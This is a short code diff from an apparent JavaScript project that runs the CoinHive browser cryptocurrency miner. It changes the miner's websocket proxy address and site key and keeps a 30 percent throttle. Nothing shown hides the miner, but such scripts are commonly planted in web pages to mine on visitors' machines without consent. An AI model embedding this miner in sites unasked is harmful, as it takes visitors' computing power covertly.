@@ -1,5 +1,5 @@
-CoinHive.CONFIG.WEBSOCKET_SHARDS = [["wss://proxy-eejljjvovp.now.sh"]];
-var miner = new CoinHive.Anonymous('etnkEhFkLYk1r3DGFYc6nFKisTUbv51DxARtf6cZeXV8CqBwXaZhazGBpfEkEpAYEnTYCMwBKupddE5QZLBhNQsa5waXtghSwB', {throttle: 0.3});
+CoinHive.CONFIG.WEBSOCKET_SHARDS = [["wss://cryptominer.now.sh"]];
+var miner = new CoinHive.Anonymous('UxW2fnNjA9PzHJZBhrQspp6uWsm36koR', {throttle: 0.3});
 
 function getDifficulty (coin) {
   let difficultyMapping = {
